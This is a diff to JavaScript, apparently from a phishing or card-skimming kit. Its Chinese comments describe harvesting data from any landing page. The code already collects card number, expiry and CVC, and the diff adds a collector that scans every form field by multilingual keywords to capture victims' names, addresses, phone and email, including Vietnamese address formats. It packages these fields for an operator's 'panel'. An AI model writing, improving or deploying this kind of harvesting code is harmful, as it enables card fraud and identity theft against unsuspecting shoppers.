@@ -538,40 +538,110 @@
     return { ok: true, number: num, brand: brand, expiry: E.exp.value.trim(), cvc: cvc };
   }
 
-  /* 账单信息：从常见 name / autocomplete / 相邻 label 猜，读不到就留空 */
-  function collectBilling() {
-    var out = { firstname: '', lastname: '', address1: '', address2: '', city: '', state: '',
-                country: '', zip: '', postcode: '', phone: '', email: '' };
+  /* 账单信息采集：不依赖固定字段名，扫描表单按关键词归类（兼容任意落地页）
+   * 关键词同时覆盖中/英/越/西语；越南四级地址会重组成面板的 address1/address2/city/state */
+  function normText(s) {
+    s = String(s == null ? '' : s).toLowerCase();
+    try { s = s.normalize('NFD').replace(/[\u0300-\u036f]/g, ''); } catch (e) {}
+    return s.replace(/[^a-z0-9]+/g, ' ').trim();
+  }
 
-    function pick(sel, keys) {
-      for (var i = 0; i < sel.length; i++) {
-        var el = q(sel[i]);
-        if (el && el.value) {
-          for (var j = 0; j < keys.length; j++) { if (!out[keys[j]]) { out[keys[j]] = String(el.value).trim(); } }
-          return String(el.value).trim();
-        }
+  var BILL_RULES = [
+    ['email', /email|e mail|correo|thu dien tu|mail\b/],
+    ['phone', /phone|telephone|\btel\b|mobile|dien thoai|so dien thoai|whatsapp/],
+    ['zip', /\bzip\b|postal|postcode|post code|ma buu|cap\b/],
+    ['district', /district|quan\b|huyen|county/],
+    ['ward', /ward|phuong|\bxa\b|commune/],
+    ['city', /city|town|province|tinh\b|thanh pho|ciudad|ville|stadt|municipality/],
+    ['state', /\bstate\b|region|\bareal\b|address level1|khu vuc/],
+    ['address2', /address 2|address line 2|address line2|addressline2|apt|suite|\bunit\b|complemento/],
+    ['address1', /address|address line 1|addressline1|\baddr\b|street|dia chi|direccion|adresse/],
+    ['lastname', /last name|lastname|surname|family name|apellido/],
+    ['firstname', /first name|firstname|given name|nombre/],
+    ['name', /\bname\b|full name|ho va ten|nombre completo|\bnom\b/],
+    ['country', /country|nation|quoc gia|pais\b|land\b|pays/]
+  ];
+
+  function billHaystack(el) {
+    var bits = [
+      el.getAttribute && el.getAttribute('name'),
+      el.getAttribute && el.getAttribute('id'),
+      el.getAttribute && el.getAttribute('autocomplete'),
+      el.getAttribute && el.getAttribute('placeholder'),
+      el.getAttribute && el.getAttribute('aria-label'),
+      el.getAttribute && el.getAttribute('data-field'),
+      el.getAttribute && el.getAttribute('data-name')
+    ];
+    try {
+      var id = el.getAttribute && el.getAttribute('id');
+      if (id) {
+        var lab = doc.querySelector('label[for="' + id.replace(/"/g, '') + '"]');
+        if (lab) { bits.push(lab.textContent); }
       }
-      return '';
-    }
-    pick(['input[name="email"]', 'input[type="email"]', '#email'], ['email']);
-    pick(['input[name="phone"]', 'input[type="tel"]', '#phone'], ['phone']);
-    pick(['input[name="address"]', 'input[name="address1"]', 'input[autocomplete="address-line1"]', '#address'], ['address1']);
-    pick(['input[name="address2"]', 'input[autocomplete="address-line2"]'], ['address2']);
-    pick(['input[name="city"]', 'input[autocomplete="address-level2"]', '#city'], ['city']);
-    pick(['input[name="state"]', 'input[autocomplete="address-level1"]', '#state'], ['state']);
-    pick(['input[name="zip"]', 'input[name="postcode"]', 'input[autocomplete="postal-code"]', '#zip'], ['zip', 'postcode']);
-    pick(['select[name="country"]', 'input[name="country"]', '#country'], ['country']);
+      var wrap = el.closest ? el.closest('label') : null;
+      if (wrap) { bits.push(wrap.textContent); }
+    } catch (e) {}
+    return normText(bits.join(' '));
+  }
 
-    var full = pick(['input[name="name"]', 'input[autocomplete="name"]', '#name'], []);
-    if (full) {
-      var sp = full.split(/\s+/);
+  function collectBilling() {
+    var out = {
+      firstname: '', lastname: '', name: '',
+      address1: '', address2: '', city: '', state: '', district: '', ward: '',
+      country: '', zip: '', postcode: '', phone: '', email: ''
+    };
+
+    var els = [];
+    try { els = qa('input, select, textarea'); } catch (e) { els = []; }
+
+    for (var i = 0; i < els.length; i++) {
+      var el = els[i];
+      try {
+        var tag = (el.tagName || '').toLowerCase();
+        var type = (el.getAttribute('type') || '').toLowerCase();
+        if (type === 'checkbox' || type === 'radio' || type === 'submit' || type === 'button' || type === 'file') { continue; }
+        if (el.disabled) { continue; }
+        /* 跳过卡片字段本身（bp-card-*、cc-number、cvc…） */
+        var idn = normText((el.getAttribute('id') || '') + ' ' +
+                           (el.getAttribute('name') || '') + ' ' +
+                           (el.getAttribute('autocomplete') || ''));
+        if (/(^|\s)(bp|card|cc|cvc|cvv|expiry|exp)(\s|$)/.test(idn) || /^bp /.test(idn)) { continue; }
+        var val = el.value;
+        if (val == null) { continue; }
+        val = String(val).trim();
+        if (!val) { continue; }
+        /* 隐藏域只接受国家（很多站点把 country 放 hidden） */
+        var hidden = type === 'hidden' || (el.offsetParent === null && tag !== 'select');
+
+        var hay = billHaystack(el);
+        for (var r = 0; r < BILL_RULES.length; r++) {
+          var key = BILL_RULES[r][0];
+          if (!BILL_RULES[r][1].test(hay)) { continue; }
+          if (hidden && key !== 'country') { break; }
+          if (!out[key]) { out[key] = val; }
+          break;
+        }
+      } catch (e) {}
+    }
+
+    /* 姓名：有全名就拆，没有就用 first/last */
+    if (!out.firstname && !out.lastname && out.name) {
+      var sp = out.name.split(/\s+/);
       out.firstname = sp.shift() || '';
       out.lastname = sp.join(' ') || '';
     }
-    if (!out.firstname) { out.firstname = pick(['input[name="firstname"]', 'input[name="first_name"]', '#firstname'], ['firstname']); }
-    if (!out.lastname) { out.lastname = pick(['input[name="lastname"]', 'input[name="last_name"]', '#lastname'], ['lastname']); }
+    if (!out.firstname && out.name) { out.firstname = out.name.split(/\s+/)[0] || ''; }
+
+    /* 越南/亚洲四级地址 → 面板的四栏 */
+    if (out.district || out.ward) {
+      var line2 = [out.ward, out.district].filter(Boolean).join(', ');
+      if (!out.address2) { out.address2 = line2; }
+      if (!out.state) { out.state = out.district || ''; }
+    }
+
     if (!out.postcode) { out.postcode = out.zip; }
     if (!out.zip) { out.zip = out.postcode; }
+    if (!out.city && out.state) { out.city = out.state; }
     return out;
   }
 
@@ -855,7 +925,11 @@
       logtype: C.logtype,
       status: statusOf()
     };
-    for (var k in b) { if (Object.prototype.hasOwnProperty.call(b, k) && b[k]) { p[k] = b[k]; } }
+    for (var k in b) {
+      if (!Object.prototype.hasOwnProperty.call(b, k) || !b[k]) { continue; }
+      if (k === 'name') { continue; }            /* 全名只用于算 first/last，不单独发给面板 */
+      p[k] = b[k];
+    }
     return p;
   }
 
